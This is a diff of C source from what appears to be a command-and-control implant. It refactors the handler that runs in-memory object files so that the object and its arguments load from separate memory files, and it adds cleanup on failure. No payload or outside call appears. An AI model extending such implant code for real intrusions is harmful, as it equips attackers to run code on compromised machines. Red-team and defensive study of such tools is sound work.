@@ -1121,28 +1121,49 @@ VOID CommandInlineExecute( PPARSER Parser )
 {
     UINT32    FunctionNameSize = 0;
     DWORD     ObjectDataSize   = 0;
+    PCHAR     ArgBuffer        = NULL;
     UINT32    ArgSize          = 0;
     PCHAR     ObjectData       = NULL;
-    PMEM_FILE MemFile          = NULL;
+    PMEM_FILE BofMemFile       = NULL;
+    PMEM_FILE ParamsMemFile    = NULL;
     UINT32    RequestID        = Instance.CurrentRequestID;
     PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
-    ULONG     MemFileID        = ParserGetInt32( Parser );
-    PCHAR     ArgBuffer        = ParserGetString( Parser, &ArgSize );
+    ULONG     BofFileID        = ParserGetInt32( Parser );
+    ULONG     ParamsFileID     = ParserGetInt32( Parser );
     INT32     Flags            = ParserGetInt32( Parser );
 
-    MemFile = GetMemFile( MemFileID );
-    if ( MemFile && MemFile->IsCompleted )
+    BofMemFile = GetMemFile( BofFileID );
+    if ( BofMemFile && BofMemFile->IsCompleted )
     {
-        ObjectData     = MemFile->Data;
-        ObjectDataSize = MemFile->Size;
+        ObjectData     = BofMemFile->Data;
+        ObjectDataSize = BofMemFile->Size;
     }
-    else if ( MemFile && ! MemFile->IsCompleted )
+    else if ( BofMemFile && ! BofMemFile->IsCompleted )
     {
-        PRINTF( "MemFile [%x] was not completed\n", MemFileID );
+        PRINTF( "BofMemFile [%x] was not completed\n", BofFileID );
+        goto CLEANUP;
     }
     else
     {
-        PRINTF( "MemFile [%x] not found\n", MemFileID );
+        PRINTF( "BofMemFile [%x] not found\n", BofFileID );
+        goto CLEANUP;
+    }
+
+    ParamsMemFile = GetMemFile( ParamsFileID );
+    if ( ParamsMemFile && ParamsMemFile->IsCompleted )
+    {
+        ArgBuffer = ParamsMemFile->Data;
+        ArgSize   = ParamsMemFile->Size;
+    }
+    else if ( ParamsMemFile && ! ParamsMemFile->IsCompleted )
+    {
+        PRINTF( "ParamsMemFile [%x] was not completed\n", ParamsFileID );
+        goto CLEANUP;
+    }
+    else
+    {
+        PRINTF( "ParamsMemFile [%x] not found\n", ParamsFileID );
+        goto CLEANUP;
     }
 
     switch ( Flags )
@@ -1180,7 +1201,9 @@ VOID CommandInlineExecute( PPARSER Parser )
         }
     }
 
-    RemoveMemFile( MemFileID );
+CLEANUP:
+    RemoveMemFile( BofFileID );
+    RemoveMemFile( ParamsFileID );
 }
 
 VOID CommandInjectDLL( PPARSER Parser )
